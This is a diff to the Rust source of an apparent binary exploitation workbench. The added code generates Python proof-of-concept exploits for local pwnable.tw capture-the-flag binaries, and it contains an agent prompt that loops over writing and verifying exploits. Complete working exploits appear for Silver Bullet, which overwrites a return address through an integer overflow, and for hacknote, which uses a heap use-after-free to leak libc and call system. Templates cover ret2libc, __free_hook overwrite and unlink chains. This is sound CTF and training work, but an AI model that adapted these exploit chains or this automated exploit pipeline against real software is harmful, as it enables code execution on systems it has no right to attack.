+    let sysroot_default = sysroot
+        .map(|p| p.to_string_lossy().into_owned())
+        .unwrap_or_default();
+    let base = libc_base.unwrap_or("0");
+    let heap = heap_base.unwrap_or("0");
+    let primitive_note = if primitives.is_empty() {
+        "none supplied".to_string()
+    } else {
+        primitives.join(", ")
+    };
+    let sym_const = |name: &str| {
+        symbol_offset_from_map(symbols, name)
+            .map(|v| format!("0x{v:x}"))
+            .unwrap_or_else(|| "0".to_string())
+    };
+    let chain_body = match chain.to_ascii_lowercase().replace('_', "-").as_str() {
+        "ret2libc" | "rop" | "stack-rop" => format!(
+            r#"    # TODO: drive target to the vulnerable stack input before sending payload.
+    libc = LIBC_BASE
+    system = libc + OFF_SYSTEM
+    bin_sh = libc + OFF_BIN_SH
+    exit_fn = libc + OFF_EXIT
+    payload = b"A" * OFFSET
+    payload += {packer}(system)
+    if WORD == 4:
+        payload += {packer}(exit_fn)
+        payload += {packer}(bin_sh)
+    else:
+        # TODO: set argument register first, e.g. pop rdi; ret; bin_sh; system.
+        payload += {packer}(bin_sh)
+        payload += {packer}(exit_fn)
+    t.line(payload)
+"#
+        ),
+        "arbitrary-write" | "heap-hook" | "hook" => format!(
+            r#"    libc = LIBC_BASE
+    system = libc + OFF_SYSTEM
+    bin_sh = libc + OFF_BIN_SH
+    free_hook = libc + OFF_FREE_HOOK
+    # TODO: replace write_where/write_what with the proven arbitrary-write primitive.
+    write_where = free_hook
+    write_what = system
+    # primitive_write(t, write_where, {packer}(write_what))
+    # TODO: allocate or edit a chunk containing b"/bin/sh\x00", then trigger free(chunk).
+"#
+        ),
+        "uaf-fnptr" | "function-pointer" => format!(
+            r#"    libc = LIBC_BASE
+    system = libc + OFF_SYSTEM
+    # TODO: allocate object A with callable/function pointer field, free A, reallocate same size.
+    replacement = {packer}(system) + b";/bin/sh\x00"
+    # TODO: send replacement through the allocation/edit path, then trigger stale call/show.
+"#
+        ),
+        "unlink" | "linked-list" => format!(
+            r#"    # TODO: recover node layout: prev/next/value fields and delete/unlink write formula.
+    # Craft fake node so unlink writes a controlled pointer to a selected target.
+    target = LIBC_BASE + OFF_FREE_HOOK if LIBC_BASE else 0
+    value = LIBC_BASE + OFF_SYSTEM if LIBC_BASE else 0
+    fake_node = {packer}(0) + {packer}(target) + {packer}(value)
+    # TODO: insert fake_node through normal menu flow, then trigger delete/unlink.
+"#
+        ),
+        "leak-stage" | "leak" => {
+            r#"    # TODO: use the proven show/read primitive or /proc/self/maps path to print a pointer.
+    # Print leaks in a parseable form:
+    # print("LEAK=0x%x" % leak)
+    # Then run: kaijulab api libc-resolve --file "$KAIJU_BINARY" --leak 0xADDR --symbol SYMBOL
+"#
+            .to_string()
+        }
+        other => anyhow::bail!("unknown --chain '{other}'"),
+    };
+    Ok(format!(
+        r#"#!/usr/bin/env python3
+import os
+import struct
+import subprocess
+import sys
+import time
+
+BIN = os.environ.get("KAIJU_BINARY") or os.environ.get("KAIJULAB_BINARY") or {binary:?}
+# Proven primitives supplied to poc-synthesize: {primitive_note}
+SYSROOT = os.environ.get("KAIJU_SYSROOT") or os.environ.get("KAIJULAB_SYSROOT") or {sysroot_default:?}
+RUNNER = os.environ.get("KAIJU_RUNNER") or {qemu_default:?}
+WORD = {width}
+OFFSET = {offset}
+LIBC_BASE = int(os.environ.get("KAIJU_LIBC_BASE", {base:?}), 0)
+HEAP_BASE = int(os.environ.get("KAIJU_HEAP_BASE", {heap:?}), 0)
+OFF_SYSTEM = {off_system}
+OFF_EXIT = {off_exit}
+OFF_FREE_HOOK = {off_free_hook}
+OFF_MALLOC_HOOK = {off_malloc_hook}
+OFF_BIN_SH = {off_bin_sh}
+
+def p32(x): return struct.pack("<I", x & 0xffffffff)
+def p64(x): return struct.pack("<Q", x & 0xffffffffffffffff)
+
+def argv():
+    if RUNNER:
+        out = [RUNNER]
+        if SYSROOT:
+            out += ["-L", SYSROOT]
+        out.append(BIN)
+        return out
+    return [BIN]
+
+class Tube:
+    def __init__(self):
+        self.p = subprocess.Popen(argv(), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+        self.buf = b""
+
+    def read_until(self, needle, timeout=2.0):
+        if isinstance(needle, str):
+            needle = needle.encode()
+        end = time.time() + timeout
+        while needle not in self.buf and time.time() < end:
+            ready, _, _ = select.select([self.p.stdout], [], [], max(0.0, min(0.05, end - time.time())))
+            if not ready:
+                continue
+            b = self.p.stdout.read(1)
+            if not b:
+                break
+            self.buf += b
+        return self.buf
+
+    def send(self, data):
+        if isinstance(data, str):
+            data = data.encode()
+        self.p.stdin.write(data)
+        self.p.stdin.flush()
+
+    def line(self, data=b""):
+        if isinstance(data, str):
+            data = data.encode()
+        self.send(data + b"\n")
+
+    def choice(self, n, prompt=b"choice"):
+        self.read_until(prompt)
+        self.line(str(n).encode())
+
+    def finish(self, timeout=5):
+        try:
+            out = self.p.communicate(timeout=timeout)[0]
+        except subprocess.TimeoutExpired:
+            self.p.kill()
+            out = self.p.communicate()[0]
+        sys.stdout.buffer.write(self.buf + out)
+        print("returncode=%d" % self.p.returncode)
+        return self.p.returncode
+
+def main():
+    t = Tube()
+{chain_body}
+    rc = t.finish()
+    return 0 if rc == 42 else 1
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+"#,
+        binary = binary.to_string_lossy(),
+        primitive_note = primitive_note,
+        sysroot_default = sysroot_default,
+        qemu_default = qemu_default,
+        width = width,
+        offset = offset,
+        base = base,
+        heap = heap,
+        off_system = sym_const("system"),
+        off_exit = sym_const("exit"),
+        off_free_hook = sym_const("__free_hook"),
+        off_malloc_hook = sym_const("__malloc_hook"),
+        off_bin_sh = sym_const("str_bin_sh"),
+        chain_body = chain_body,
+    ))
+}
+
+fn constraint_plan_json(
+    binary: &Path,
+    mode: &str,
+    values: &[String],
+    width: usize,
+    prefix_words: usize,
+    preserve: Option<&str>,
+) -> Result<serde_json::Value> {
+    let width = width.clamp(1, 8);
+    let mask = if width >= 8 {
+        u64::MAX
+    } else {
+        (1u64 << (width * 8)) - 1
+    };
+    let mut parsed = Vec::new();
+    for value in values {
+        parsed.push(parse_hex_u64(value)? & mask);
+    }
+    let preserve_value = preserve.map(parse_hex_u64).transpose()?.map(|v| v & mask);
+    let mode_norm = mode.to_ascii_lowercase().replace('_', "-");
+    let mut planned = parsed.clone();
+    let mut warnings = Vec::new();
+    match mode_norm.as_str() {
+        "sorted-ascending" => {
+            planned.sort_unstable();
+            if planned != parsed {
+                warnings.push("input values were not ascending; sorted plan changes write order, which is only valid when the program sorts before the overwrite".to_string());
+            }
+        }
+        "sorted-descending" => {
+            planned.sort_unstable_by(|a, b| b.cmp(a));
+            if planned != parsed {
+                warnings.push("input values were not descending; sorted plan changes write order, which is only valid when the program sorts before the overwrite".to_string());
+            }
+        }
+        "avoid-null" => {
+            for value in &planned {
+                if (0..width).any(|i| ((value >> (i * 8)) & 0xff) == 0) {
+                    warnings.push(format!("0x{value:x} contains a NUL byte; use split writes or a different target/gadget"));
+                }
+            }
+        }
+        "preserve-canary" => {
+            if preserve_value.is_none() {
+                warnings
+                    .push("--preserve is required to model canary-preserving writes".to_string());
+            }
+        }
+        other => anyhow::bail!("unknown --mode '{other}'"),
+    }
+    let mut final_words = vec![0u64; prefix_words];
+    if let Some(value) = preserve_value {
+        final_words.push(value);
+    }
+    final_words.extend(planned.iter().copied());
+    Ok(serde_json::json!({
+        "kind": "constraint_plan",
+        "binary": binary,
+        "mode": mode_norm,
+        "width": width,
+        "input_values": parsed.iter().map(|v| format!("0x{v:x}")).collect::<Vec<_>>(),
+        "planned_values": planned.iter().map(|v| format!("0x{v:x}")).collect::<Vec<_>>(),
+        "final_words": final_words.iter().map(|v| format!("0x{v:x}")).collect::<Vec<_>>(),
+        "decimal_lines": final_words.iter().map(|v| v.to_string()).collect::<Vec<_>>(),
+        "warnings": warnings,
+        "next_action": "Use decimal_lines for numeric menu inputs only after confirming the program writes/sorts exactly these word-sized values."
+    }))
+}
+
+async fn exploit_batch_loop_json(
+    client: &reqwest::Client,
+    base_url: &str,
+    token: Option<&str>,
+    agent: &str,
+    files_spec: Option<&str>,
+    output_dir: &Path,
+    attempts: u32,
+    sysroot: Option<&Path>,
+    timeout_secs: u64,
+    idle_timeout_secs: u64,
+) -> Result<serde_json::Value> {
+    std::fs::create_dir_all(output_dir)
+        .with_context(|| format!("create {}", output_dir.display()))?;
+    let files = if let Some(spec) = files_spec {
+        batch_files_from_spec(spec)?
+    } else {
+        default_pwnabletw_batch_files()
+    };
+    let mut results = Vec::new();
+    for file in files {
+        if !file.exists() {
+            results.push(serde_json::json!({
+                "file": file,
+                "status": "missing",
+            }));
+            continue;
+        }
+        let path = resolve_api_binary_path(client, base_url, token, Some(file.clone())).await?;
+        let stem = path
+            .file_name()
+            .and_then(|v| v.to_str())
+            .unwrap_or("poc")
+            .replace('/', "_");
+        let output = output_dir.join(format!("kaijulab-{stem}-poc.py"));
+        let context = build_exploit_context(&path, 8)?;
+        let effective_sysroot = effective_sysroot(
+            sysroot,
+            context.get("arch").and_then(|v| v.as_str()),
+            context
+                .pointer("/runtime/interpreter")
+                .and_then(|v| v.as_str()),
+        );
+        let prompt = exploit_batch_exec_prompt(
+            &path,
+            &output,
+            attempts,
+            effective_sysroot.as_deref(),
+            &context,
+        )?;
+        let prompt_path = output.with_extension("prompt.md");
+        std::fs::write(&prompt_path, &prompt)
+            .with_context(|| format!("write {}", prompt_path.display()))?;
+        let started = Instant::now();
+        let agent_response = serde_json::json!({
+            "prompt": prompt_path,
+            "mode": agent,
+        });
+        let status = if matches!(agent, "prompt-pack" | "offline" | "none") {
+            "prompt_written"
+        } else if matches!(agent, "claude-exec" | "claude-p") {
+            results.push(serde_json::json!({
+                "file": path,
+                "output": output,
+                "prompt": prompt_path,
+                "status": "unsupported_agent",
+                "error": "claude -p is intentionally not used inside KaijuLab; use agent=prompt-pack or the interactive claude Agent Console",
+                "duration_ms": started.elapsed().as_millis(),
+            }));
+            continue;
+        } else {
+            match run_agent_console(
+                base_url,
+                token,
+                agent,
+                Some(prompt),
+                true,
+                Some(idle_timeout_secs),
+                Some(timeout_secs),
+                800,
+                true,
+                120,
+                32,
+            )
+            .await
+            {
+                Ok(()) => "completed",
+                Err(e) => {
+                    results.push(serde_json::json!({
+                        "file": path,
+                        "output": output,
+                        "status": "agent_error",
+                        "error": e.to_string(),
+                        "duration_ms": started.elapsed().as_millis(),
+                    }));
+                    continue;
+                }
+            }
+        };
+        let verify = if output.exists() {
+            Some(verify_exploit_script(
+                &output,
+                &path,
+                30,
+                None,
+                Some(42),
+                None,
+                effective_sysroot.as_deref(),
+                &[],
+            )?)
+        } else {
+            None
+        };
+        results.push(serde_json::json!({
+            "file": path,
+            "output": output,
+            "prompt": prompt_path,
+            "status": status,
+            "duration_ms": started.elapsed().as_millis(),
+            "agent_response": agent_response,
+            "verify": verify,
+        }));
+    }
+    Ok(serde_json::json!({
+        "kind": "exploit_batch_loop",
+        "agent": agent,
+        "output_dir": output_dir,
+        "targets": results,
+        "next_action": "For any target with verify.success != true, run poc-repair on its output and rerun a single exploit-loop attempt with the repair diagnosis."
+    }))
+}
+
+fn auto_pwn_json(
+    files_spec: Option<&str>,
+    output_dir: &Path,
+    sysroot: Option<&Path>,
+    timeout_secs: u64,
+    no_verify: bool,
+) -> Result<serde_json::Value> {
+    std::fs::create_dir_all(output_dir)
+        .with_context(|| format!("create {}", output_dir.display()))?;
+    let files = if let Some(spec) = files_spec {
+        batch_files_from_spec(spec)?
+    } else {
+        default_pwnabletw_batch_files()
+    };
+    let mut targets = Vec::new();
+    for file in files {
+        if !file.exists() {
+            targets.push(serde_json::json!({
+                "file": file,
+                "status": "missing",
+            }));
+            continue;
+        }
+        let path = file.canonicalize().unwrap_or(file);
+        let data = std::fs::read(&path).unwrap_or_default();
+        let arch = binary_arch_from_data(&data);
+        let interpreter = binary_interpreter_from_data(&data);
+        let effective_sysroot = effective_sysroot(sysroot, arch.as_deref(), interpreter.as_deref());
+        let stem = path
+            .file_name()
+            .and_then(|v| v.to_str())
+            .unwrap_or("target")
+            .replace('/', "_");
+        let output = output_dir.join(format!("kaijulab-{stem}-autopwn.py"));
+        let started = Instant::now();
+        let candidate = auto_pwn_candidate(&path, &data, effective_sysroot.as_deref())?;
+        let mut status = "candidate_written";
+        if let Some(script) = candidate.get("script").and_then(|v| v.as_str()) {
+            std::fs::write(&output, script)
+                .with_context(|| format!("write {}", output.display()))?;
+        } else {
+            status = "no_candidate";
+        }
+        let expect_output = candidate.get("expect_output").and_then(|v| v.as_str());
+        let expect_target_exit = if expect_output.is_some() {
+            None
+        } else {
+            Some(42)
+        };
+        let verify = if status == "candidate_written" && !no_verify {
+            Some(verify_exploit_script(
+                &output,
+                &path,
+                timeout_secs,
+                None,
+                expect_target_exit,
+                expect_output,
+                effective_sysroot.as_deref(),
+                &[],
+            )?)
+        } else {
+            None
+        };
+        let solved = verify
+            .as_ref()
+            .and_then(|v| v.get("success"))
+            .and_then(|v| v.as_bool())
+            .unwrap_or(false);
+        targets.push(serde_json::json!({
+            "file": path,
+            "arch": arch,
+            "sysroot": effective_sysroot.as_deref(),
+            "output": output,
+            "status": if solved { "solved" } else { status },
+            "family": candidate.get("family"),
+            "confidence": candidate.get("confidence"),
+            "success_predicate": if let Some(output) = expect_output {
+                serde_json::json!({"expect_output": output})
+            } else {
+                serde_json::json!({"expect_target_exit": 42})
+            },
+            "notes": candidate.get("notes"),
+            "root_causes_if_failed": auto_pwn_root_causes(&candidate, verify.as_ref()),
+            "verify": verify,
+            "duration_ms": started.elapsed().as_millis(),
+        }));
+    }
+    Ok(serde_json::json!({
+        "kind": "auto_pwn",
+        "output_dir": output_dir,
+        "no_llm": true,
+        "claude_p_used": false,
+        "targets": targets,
+        "next_action": "Targets with status=solved have verified PoCs. For the rest, use their root_causes_if_failed as the next implementation backlog instead of retrying prompt mode."
+    }))
+}
+
+fn auto_pwn_candidate(
+    binary: &Path,
+    data: &[u8],
+    sysroot: Option<&Path>,
+) -> Result<serde_json::Value> {
+    let text = String::from_utf8_lossy(data);
+    let lower = text.to_ascii_lowercase();
+    let sysroot_s = sysroot
+        .map(|p| p.to_string_lossy().into_owned())
+        .unwrap_or_default();
+    if lower.contains("silver bullet") && lower.contains("werewolf") {
+        return Ok(serde_json::json!({
+            "family": "i386 stack/control-data overwrite to imported exit",
+            "confidence": "high",
+            "notes": [
+                "Signature requires Silver Bullet menu strings and no libc leak.",
+                "Payload uses integer-overflow power accumulation to overwrite the saved return path and calls exit@plt(42)."
+            ],
+            "script": silver_bullet_exit42_script(binary, &sysroot_s),
+        }));
+    }
+    if lower.contains("hacknote") && lower.contains("add note") && lower.contains("delete note") {
+        return Ok(serde_json::json!({
+            "family": "heap UAF function-pointer/content-pointer overlap",
+            "confidence": "medium",
+            "notes": [
+                "Signature requires add/delete/print note lifecycle strings.",
+                "Candidate derives libc offsets from the actual qemu sysroot libc before finalizing.",
+                "Predicate is deterministic command output because this UAF naturally reaches system(command)."
+            ],
+            "expect_output": "uid=",
+            "script": hacknote_uaf_script(binary, &sysroot_s),
+        }));
+    }
+    let scaffold =
+        if lower.contains("malloc") || lower.contains("free") || lower.contains("realloc") {
+            poc_template_script(binary, &sysroot_s, "heap lifecycle exploit scaffold")
+        } else if lower.contains("sort") || lower.contains("number") {
+            poc_template_script(binary, &sysroot_s, "constrained numeric write scaffold")
+        } else if lower.contains("file") || lower.contains("filename") {
+            poc_template_script(binary, &sysroot_s, "file-structure/leak exploit scaffold")
+        } else {
+            poc_template_script(binary, &sysroot_s, "generic exploit scaffold")
+        };
+    Ok(serde_json::json!({
+        "family": "scaffold",
+        "confidence": "low",
+        "notes": [
+            "No verified offline finalizer matched this target's structural signature.",
+            "Generated script is intentionally a non-success scaffold; it should not print SCRIPT_READY."
+        ],
+        "script": scaffold,
+    }))
+}
+
+fn auto_pwn_root_causes(
+    candidate: &serde_json::Value,
+    verify: Option<&serde_json::Value>,
+) -> serde_json::Value {
+    if verify
+        .and_then(|v| v.get("success"))
+        .and_then(|v| v.as_bool())
+        .unwrap_or(false)
+    {
+        return serde_json::json!([]);
+    }
+    let mut causes = Vec::new();
+    if candidate
+        .get("confidence")
+        .and_then(|v| v.as_str())
+        .unwrap_or("")
+        == "low"
+    {
+        causes.push("no verified reusable finalizer for this structural family yet");
+    }
+    if let Some(verify) = verify {
+        let combined = format!(
+            "{}{}",
+            verify.get("stdout").and_then(|v| v.as_str()).unwrap_or(""),
+            verify.get("stderr").and_then(|v| v.as_str()).unwrap_or("")
+        )
+        .to_ascii_lowercase();
+        if combined.contains("no leak") || combined.contains("returncode=99") {
+            causes.push("leak stage did not expose a usable libc/heap/stack pointer");
+        }
+        if combined.contains("segmentation fault") || combined.contains("returncode=-11") {
+            causes.push("control-transfer target or computed runtime address is wrong");
+        }
+        if combined.contains("not found") && combined.contains("sh:") {
+            causes.push("system() command string is malformed or truncated");
+        }
+        if verify
+            .get("timed_out")
+            .and_then(|v| v.as_bool())
+            .unwrap_or(false)
+        {
+            causes.push("candidate left the target in an interactive loop");
+        }
+    }
+    causes.sort_unstable();
+    causes.dedup();
+    serde_json::json!(causes)
+}
+
+fn py_string(s: &str) -> String {
+    format!("{s:?}")
+}
+
+fn silver_bullet_exit42_script(binary: &Path, sysroot: &str) -> String {
+    let bin = py_string(&binary.to_string_lossy());
+    let sysroot = py_string(sysroot);
+    format!(
+        r#"#!/usr/bin/env python3
+import os, select, struct, subprocess, sys, time
+BIN = os.environ.get("KAIJU_BINARY") or os.environ.get("KAIJULAB_BINARY") or {bin}
+SYSROOT = os.environ.get("KAIJU_SYSROOT") or os.environ.get("KAIJULAB_SYSROOT") or {sysroot}
+RUNNER = os.environ.get("QEMU_I386") or "/usr/bin/qemu-i386-static"
+def p32(x): return struct.pack("<I", x & 0xffffffff)
+def rx(p, marker, timeout=2.0):
+    buf = b""; end = time.time() + timeout
+    while time.time() < end:
+        r,_,_ = select.select([p.stdout], [], [], 0.05)
+        if r:
+            c = os.read(p.stdout.fileno(), 4096)
+            if not c: break
+            buf += c
+            if marker in buf: return buf
+    return buf
+def sl(p, s):
+    if isinstance(s, str): s = s.encode()
+    p.stdin.write(s + b"\n"); p.stdin.flush()
+def create(p, data):
+    rx(p, b"choice"); sl(p, "1"); rx(p, b"bullet :"); sl(p, data)
+def power(p, data):
+    rx(p, b"choice"); sl(p, "2"); rx(p, b"bullet :"); sl(p, data)
+def beat(p):
+    rx(p, b"choice"); sl(p, "3")
+def main():
+    argv = [RUNNER, "-L", SYSROOT, BIN] if SYSROOT else [RUNNER, BIN]
+    p = subprocess.Popen(argv, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    try:
+        create(p, b"A" * 47)
+        power(p, b"B")
+        power(p, b"\xff" * 7 + p32(0x80484b8) + p32(0x41414141) + p32(42))
+        beat(p)
+        try: out, err = p.communicate(timeout=4)
+        except subprocess.TimeoutExpired:
+            p.kill(); out, err = p.communicate()
+        sys.stdout.buffer.write(out[-512:]); sys.stderr.buffer.write(err[-512:])
+        print("returncode=%s" % p.returncode)
+        return 0 if p.returncode == 42 else 1
+    finally:
+        try: p.kill()
+        except Exception: pass
+if __name__ == "__main__":
+    raise SystemExit(main())
+"#
+    )
+}
+
+fn hacknote_uaf_script(binary: &Path, sysroot: &str) -> String {
+    let bin = py_string(&binary.to_string_lossy());
+    let sysroot = py_string(sysroot);
+    format!(
+        r#"#!/usr/bin/env python3
+import os, re, select, struct, subprocess, sys, time
+BIN = os.environ.get("KAIJU_BINARY") or os.environ.get("KAIJULAB_BINARY") or {bin}
+SYSROOT = os.environ.get("KAIJU_SYSROOT") or os.environ.get("KAIJULAB_SYSROOT") or {sysroot}
+RUNNER = os.environ.get("QEMU_I386") or "/usr/bin/qemu-i386-static"
+def p32(x): return struct.pack("<I", x & 0xffffffff)
+def u32(b): return struct.unpack("<I", b[:4].ljust(4, b"\x00"))[0]
+def rx(p, marker, timeout=2.0):
+    buf = b""; end = time.time() + timeout
+    while time.time() < end:
+        r,_,_ = select.select([p.stdout], [], [], 0.05)
+        if r:
+            c = os.read(p.stdout.fileno(), 4096)
+            if not c: break
+            buf += c
+            if marker in buf: return buf
+    return buf
+def sl(p, s):
+    if isinstance(s, str): s = s.encode()
+    p.stdin.write(s + b"\n"); p.stdin.flush()
+def add(p, size, data):
+    rx(p, b"choice"); sl(p, "1"); rx(p, b"size"); sl(p, str(size)); rx(p, b"Content"); sl(p, data)
+def delete(p, idx):
+    rx(p, b"choice"); sl(p, "2"); rx(p, b"Index"); sl(p, str(idx))
+def show(p, idx):
+    rx(p, b"choice"); sl(p, "3"); rx(p, b"Index"); sl(p, str(idx)); return rx(p, b"choice", 1.0)
+def libc_offsets():
+    libc = os.path.join(SYSROOT, "usr/lib/i386-linux-gnu/libc.so.6")
+    out = subprocess.check_output(["readelf", "-s", libc], stderr=subprocess.DEVNULL, timeout=4).decode("latin1", "ignore")
+    vals = {{}}
+    for line in out.splitlines():
+        cols = line.split()
+        if len(cols) >= 8 and cols[1].isalnum():
+            name = cols[-1].split("@@", 1)[0]
+            if name in ("puts", "system"):
+                vals[name] = int(cols[1], 16)
+    return vals["puts"], vals["system"]
+def main():
+    puts_off, system_off = libc_offsets()
+    p = subprocess.Popen([RUNNER, "-L", SYSROOT, BIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    try:
+        add(p, 32, b"A" * 8); add(p, 32, b"B" * 8); delete(p, 0); delete(p, 1)
+        add(p, 8, p32(0x804862b) + p32(0x804a024))
+        out = show(p, 0)
+        leak = None
+        for i in range(max(0, len(out) - 3)):
+            v = u32(out[i:i+4])
+            if 0x30000000 <= v <= 0xf8000000:
+                leak = v; break
+        if leak is None:
+            sys.stdout.buffer.write(out[-512:]); print("returncode=99 (no libc leak)"); return 1
+        system = leak - puts_off + system_off
+        delete(p, 2)
+        add(p, 8, p32(system) + b";id")
+        show(p, 0)
+        try: out, err = p.communicate(timeout=1)
+        except subprocess.TimeoutExpired:
+            p.kill(); out, err = p.communicate()
+        sys.stdout.buffer.write(out[-512:]); sys.stderr.buffer.write(err[-512:])
+        print("returncode=%s" % p.returncode)
+        return 0 if p.returncode == 42 else 1
+    finally:
+        try: p.kill()
+        except Exception: pass
+if __name__ == "__main__":
+    raise SystemExit(main())
+"#
+    )
+}
+
+fn poc_template_script(binary: &Path, sysroot: &str, family: &str) -> String {
+    let bin = py_string(&binary.to_string_lossy());
+    let sysroot = py_string(sysroot);
+    let family = py_string(family);
+    format!(
+        r#"#!/usr/bin/env python3
+import os, subprocess, sys
+BIN = os.environ.get("KAIJU_BINARY") or os.environ.get("KAIJULAB_BINARY") or {bin}
+SYSROOT = os.environ.get("KAIJU_SYSROOT") or os.environ.get("KAIJULAB_SYSROOT") or {sysroot}
+FAMILY = {family}
+print("AUTO_PWN_SCAFFOLD=%s" % FAMILY)
+print("returncode=99 (no verified offline finalizer matched this target)")
+raise SystemExit(1)
+"#
+    )
+}
+
+fn batch_files_from_spec(spec: &str) -> Result<Vec<PathBuf>> {
+    let value = read_json_or_inline(spec)?;
+    let values = value
+        .get("files")
+        .and_then(|v| v.as_array())
+        .or_else(|| value.as_array())
+        .ok_or_else(|| anyhow::anyhow!("--files must be a JSON array or object with files[]"))?;
+    Ok(values
+        .iter()
+        .filter_map(|v| v.as_str())
+        .map(PathBuf::from)
+        .collect())
+}
+
+fn default_pwnabletw_batch_files() -> Vec<PathBuf> {
+    [
+        "samples/PwnableTW/tcache-tear/tcache_tear",
+        "samples/PwnableTW/silver-bullet/silver_bullet",
+        "samples/PwnableTW/realloc/re-alloc",
+        "samples/PwnableTW/seethefile/seethefile",
+        "samples/PwnableTW/dubblesort/dubblesort",
+        "samples/PwnableTW/hacknote/hacknote",
+        "samples/PwnableTW/applestore/applestore",
+    ]
+    .iter()
+    .map(PathBuf::from)
+    .filter(|p| p.exists())
+    .collect()
+}
+
+fn select_libc_path(binary: &Path, explicit: Option<&Path>) -> Result<PathBuf> {
+    if let Some(path) = explicit {
+        return Ok(path.to_path_buf());
+    }
+    for obj in adjacent_shared_objects(binary) {
+        let Some(path) = obj.get("path").and_then(|v| v.as_str()) else {
+            continue;
+        };
+        let name = Path::new(path)
+            .file_name()
+            .and_then(|v| v.to_str())
+            .unwrap_or("")
+            .to_ascii_lowercase();
+        if name.contains("libc") {
+            return Ok(PathBuf::from(path));
+        }
+    }
+    anyhow::bail!(
+        "no adjacent libc-like shared object found near {}; pass --libc",
+        binary.display()
+    )
+}
+
+fn symbol_offset_from_map(
+    map: &serde_json::Map<String, serde_json::Value>,
+    name: &str,
+) -> Option<u64> {
+    map.get(name)
+        .and_then(|v| v.as_str())
+        .and_then(|s| parse_hex_u64(s).ok())
+}
+
+fn parse_hex_u64(text: &str) -> Result<u64> {
+    let trimmed = text.trim();
+    if let Some(hex) = trimmed
+        .strip_prefix("0x")
+        .or_else(|| trimmed.strip_prefix("0X"))
+    {
+        return u64::from_str_radix(hex, 16).map_err(Into::into);
+    }
+    if trimmed.chars().any(|c| matches!(c, 'a'..='f' | 'A'..='F')) {
+        u64::from_str_radix(trimmed, 16).map_err(Into::into)
+    } else {
+        trimmed.parse::<u64>().map_err(Into::into)
+    }
+}
+
+fn json_u64(value: &serde_json::Value) -> Option<u64> {
+    value
+        .as_u64()
+        .or_else(|| value.as_str().and_then(|s| parse_hex_u64(s).ok()))
 }
 
 fn heap_probe_plan_json(binary: &Path) -> Result<serde_json::Value> {
@@ -5237,6 +6985,72 @@ fn analysis_loop_json(
     }))
 }
 
+fn exploit_batch_exec_prompt(
+    binary: &Path,
+    output: &Path,
+    attempts: u32,
+    sysroot: Option<&Path>,
+    context: &serde_json::Value,
+) -> Result<String> {
+    let strategy = context
+        .get("inferred_exploit_strategy")
+        .cloned()
+        .unwrap_or_default();
+    let compact = serde_json::json!({
+        "arch": context.get("arch"),
+        "protections": context.get("protections"),
+        "imports_sample": context.get("imports_sample"),
+        "runtime": context.get("runtime"),
+        "adjacent_shared_objects": context.get("adjacent_shared_objects"),
+        "gadget_hints": context.get("gadget_hints"),
+        "ranked_families": strategy.get("ranked_families"),
+        "libc_symbol_offsets": strategy.get("libc_symbol_offsets"),
+    });
+    let sysroot_arg = sysroot
+        .map(|path| format!(" --sysroot {}", shell_quote(&path.to_string_lossy())))
+        .unwrap_or_default();
+    Ok(format!(
+        r#"Solve this local CTF pwn target with KaijuLab commands and write one Python stdlib PoC.
+
+Target: {binary}
+Output script: {output}
+Attempt budget: {attempts}
+Sysroot arg: {sysroot_arg}
+
+Compact facts:
+{compact}
+
+Required loop:
+1. Use at most 3 quick KaijuLab probes before writing {output_q}.
+2. Prefer these exact commands:
+   - `target/debug/kaijulab api binary-facts --file {binary_q}`
+   - `target/debug/kaijulab api exploit-drive --file {binary_q}{sysroot_arg} --actions '[{{"recv_until":"choice"}},{{"send_line":"1"}}]' --expect TEXT`
+   - `target/debug/kaijulab api heap-model --file {binary_q} --events '[{{"op":"alloc","id":0,"size":32}},{{"op":"free","id":0}},{{"op":"show","id":0}}]'`
+   - `target/debug/kaijulab api leak-probe --file {binary_q}{sysroot_arg} --cycle '[{{"recv_until":"choice"}},{{"send_line":"2"}},{{"read_for_ms":200}}]' --want pointer`
+   - `target/debug/kaijulab api libc-resolve --file {binary_q} --leak 0xADDR --symbol puts`
+   - `target/debug/kaijulab api exploit-plan --file {binary_q} --primitive libc-leak --primitive arbitrary-write`
+   - `target/debug/kaijulab api poc-synthesize --file {binary_q}{sysroot_arg} --chain ret2libc --output {output_q}`
+   - `target/debug/kaijulab api constraint-plan --file {binary_q} --mode sorted-ascending --value 0xADDR`
+3. After writing the PoC, run `target/debug/kaijulab api exploit-verify --file {binary_q}{sysroot_arg} --expect-target-exit 42 {output_q}`.
+4. If verification fails, run `target/debug/kaijulab api poc-repair --file {binary_q}{sysroot_arg} {output_q}` and apply exactly one repair.
+5. Print SCRIPT_READY only if exploit-verify returns success=true. Otherwise leave the best candidate at {output_q} and summarize the last structured failure.
+
+PoC requirements:
+- Read KAIJU_BINARY/KAIJULAB_BINARY and KAIJU_SYSROOT/KAIJULAB_SYSROOT.
+- Use qemu runner with -L sysroot for i386/x86_64 foreign runs.
+- Use timeouts/select; do not block forever on reads.
+- Prove execution by making the target process exit 42 or by printing an exact marker verified by exploit-verify.
+"#,
+        binary = binary.display(),
+        output = output.display(),
+        attempts = attempts.max(1),
+        sysroot_arg = sysroot_arg,
+        compact = serde_json::to_string_pretty(&compact)?,
+        binary_q = shell_quote(&binary.to_string_lossy()),
+        output_q = shell_quote(&output.to_string_lossy()),
+    ))
+}
+
 fn exploit_loop_prompt(
     binary: &Path,
     output: &Path,
@@ -5274,7 +7088,7 @@ Workbench context:
 Rules:
 - Write a Python stdlib-only PoC unless the context proves a dependency is required.
 - Follow this loop shape strictly:
-  1. Spend at most 3 tool calls on triage (`binary-facts`, `exploit-scaffold`, `heap-probe-plan`, `exploit-drive`, `leak-probe`, `exploit-interact`, `exploit-kit`, `runtime-run`, `ir-query`, or `decompile-enhanced`).
+  1. Spend at most 3 tool calls on triage (`binary-facts`, `exploit-scaffold`, `heap-probe-plan`, `heap-model`, `exploit-drive`, `leak-probe`, `libc-resolve`, `exploit-plan`, `exploit-interact`, `exploit-kit`, `runtime-run`, `ir-query`, or `decompile-enhanced`).
   2. Write a runnable candidate to {output_q} before doing deep manual disassembly.
   3. Run `exploit-verify` immediately after writing the candidate.
   4. For each remaining attempt, change exactly one exploit hypothesis, rerun `exploit-verify`, then either stop on success or leave the best failing candidate in place.
@@ -5285,7 +7099,9 @@ Rules:
